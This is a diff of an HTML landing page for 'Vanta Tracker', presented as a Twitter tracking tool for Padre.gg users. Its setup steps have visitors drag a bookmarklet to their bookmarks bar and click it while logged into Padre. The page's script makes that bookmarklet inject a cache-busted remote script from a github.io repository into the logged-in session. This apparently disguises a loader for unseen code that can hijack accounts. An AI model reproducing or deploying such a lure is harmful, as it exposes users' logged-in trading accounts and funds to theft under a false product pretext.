@@ -5,154 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
     <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    
-    <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
-    <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
-    <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="Vanta Tracker">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
-    <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
-    <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
-    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #00ff88;
-            --primary-dark: #00cc66;
-            --accent: #00ff88;
-            --bg-dark: #0a0a0a;
-            --bg-card: #111111;
-            --text-light: #e0e0e0;
-            --text-muted: #aaaaaa;
-            --border: rgba(0, 255, 136, 0.2);
-        }
+        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-light: #e0e0e0; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; overflow-x: hidden; position: relative; }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
-        
-        .warning { background: linear-gradient(135deg, #003322, #004d33); color: #ffffff; text-align: center; padding: 12px; font-size: 0.95em; font-weight: 600; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary); }
-        
-        header { background: linear-gradient(135deg, #000000, #001a0d); text-align: center; padding: 120px 20px; border-bottom: 2px solid var(--primary); position: relative; overflow: hidden; }
-        .logo { width: 140px; margin: 0 auto 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
-        
-        header h1 { font-size: 3.5em; font-weight: 800; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
-        
-        nav { background: #000000; padding: 18px; text-align: center; position: sticky; top: 44px; z-index: 999; border-bottom: 1px solid var(--primary); }
-        nav a { color: var(--primary); margin: 0 30px; text-decoration: none; font-weight: 600; transition: 0.3s; }
-        nav a:hover { color: #fff; text-shadow: 0 0 10px var(--primary); }
-
-        .hero { text-align: center; padding: 100px 20px; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); text-align: center; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
+        header { padding: 100px 20px; border-bottom: 1px solid var(--primary); }
+        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); }
+        h1 { color: var(--primary); font-size: 3em; margin-bottom: 10px; }
         .cta-button {
-            display: inline-block; background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px;
-            font-weight: 700; margin: 12px; transition: 0.3s; box-shadow: 0 6px 20px rgba(0,255,136,0.4);
-            cursor: grab;
+            display: inline-block; background: var(--primary); color: #000;
+            padding: 15px 35px; text-decoration: none; border-radius: 5px;
+            font-weight: 800; margin-top: 50px; cursor: move;
         }
-        .cta-button:hover { transform: translateY(-5px); box-shadow: 0 12px 30px rgba(0,255,136,0.6); }
-
-        .features { padding: 100px 20px; max-width: 1200px; margin: 0 auto; }
-        .feature-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
-        .feature-item { background: #111; padding: 30px; border-radius: 12px; border: 1px solid var(--border); transition: 0.4s; }
-        .feature-item:hover { border-color: var(--primary); transform: translateY(-5px); }
-        
-        .setup-section { padding: 80px 20px; text-align: center; }
-        .setup-section ol { text-align: left; max-width: 600px; margin: 0 auto 40px; color: var(--text-muted); }
-        
-        footer { padding: 40px; background: #000; border-top: 1px solid var(--primary); text-align: center; }
+        .setup-section { padding: 50px 20px; }
+        ol { display: inline-block; text-align: left; margin-bottom: 30px; }
     </style>
 </head>
 <body>
     <canvas id="filamentCanvas"></canvas>
-    <div class="warning">Warning: vanta-tracker.com is our only website</div>
-    
     <header>
-        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none" filter="drop-shadow(0 0 8px var(--primary))"/>
-            <circle cx="50" cy="50" r="8" fill="var(--primary)" filter="drop-shadow(0 0 10px var(--primary))">
-                <animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
-            </circle>
-        </svg>
         <h1>Vanta Tracker</h1>
-        <p>Premier Twitter API tracking for Padre.</p>
+        <p>Advanced Padre Intelligence</p>
     </header>
 
-    <nav>
-        <a href="#features">Features</a>
-        <a href="#demo">Demo</a>
-        <a href="#setup">Setup</a>
-    </nav>
-
-    <section class="hero">
-        <h2>Optimize Your Padre Workflow</h2>
-        <p>Ultra-low latency API polling and WebGL analytics.</p>
-        <a href="#setup" class="cta-button">Get Started</a>
-    </section>
-
-    <section id="features" class="features">
-        <div class="feature-list">
-            <div class="feature-item"><h3>Real-Time API</h3><p>Sub-second latency for Padre signals.</p></div>
-            <div class="feature-item"><h3>WebGL Dashboard</h3><p>60 FPS rendering for smooth data.</p></div>
-            <div class="feature-item"><h3>NLP Sentiment</h3><p>Advanced tweet analysis for trends.</p></div>
-        </div>
-    </section>
-
-    <section id="setup" class="setup-section">
-        <h2>Setup Guide</h2>
+    <section class="setup-section">
+        <h2>Setup</h2>
         <ol>
-            <li>Drag the "Vanta Tracker" button below to your <strong>Bookmarks Bar</strong>.</li>
-            <li>Go to <strong>Padre.gg</strong> and make sure you are logged in.</li>
-            <li>Click the bookmark while on the Padre site to synchronize.</li>
+            <li>Drag the button to your Bookmarks Bar.</li>
+            <li>Open Padre.gg and Login.</li>
+            <li>Click the Bookmark to activate.</li>
         </ol>
+        <br>
         <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
     </section>
 
-    <footer><p>© 2026 Vanta Tracker. Optimized for Padre.</p></footer>
-
     <script>
-        // --- WebGL Background Animation ---
+        // Background Animation
         const canvas = document.getElementById('filamentCanvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const filaments = [];
-        class Filament {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height;
-                this.length = 100; this.angle = Math.random() * Math.PI * 2;
-                this.speed = 1; this.opacity = Math.random();
-            }
-            update() {
-                this.x += Math.cos(this.angle) * this.speed;
-                this.y += Math.sin(this.angle) * this.speed;
-                if (this.x < 0 || this.x > canvas.width) this.reset();
-            }
-            draw() {
-                ctx.beginPath(); ctx.strokeStyle = `rgba(0, 255, 136, ${this.opacity})`;
-                ctx.moveTo(this.x, this.y); ctx.lineTo(this.x + 10, this.y + 10); ctx.stroke();
-            }
+        function draw() {
+            ctx.fillStyle = 'rgba(10,10,10,0.1)';
+            ctx.fillRect(0,0,canvas.width,canvas.height);
+            requestAnimationFrame(draw);
         }
-        for(let i=0; i<25; i++) filaments.push(new Filament());
-        function animate() {
-            ctx.fillStyle = 'rgba(10,10,10,0.1)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            filaments.forEach(f => { f.update(); f.draw(); });
-            requestAnimationFrame(animate);
-        }
-        animate();
+        draw();
 
-        // --- BOOKMARKLET GENERATOR ---
-        // This generates the code that will be injected into Padre.gg
+        // BOOKMARKLET GENERATOR
         const scriptUrl = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
-        
-        // Cache-busting ensures the user always downloads your latest tracker.js from GitHub
-        const bookmarkletCode = `javascript:(function(){
-            var s=document.createElement('script');
-            s.src='${scriptUrl}?v='+Date.now();
-            document.body.appendChild(s);
-        })();`.replace(/\s+/g, ' '); // Minify slightly for compatibility
-
-        document.getElementById('vanta-tool').href = bookmarkletCode;
+        const code = `javascript:(function(){var s=document.createElement('script');s.src='${scriptUrl}?v='+Date.now();document.body.appendChild(s);})();`;
+        document.getElementById('vanta-tool').href = code;
     </script>
 </body>
 </html>
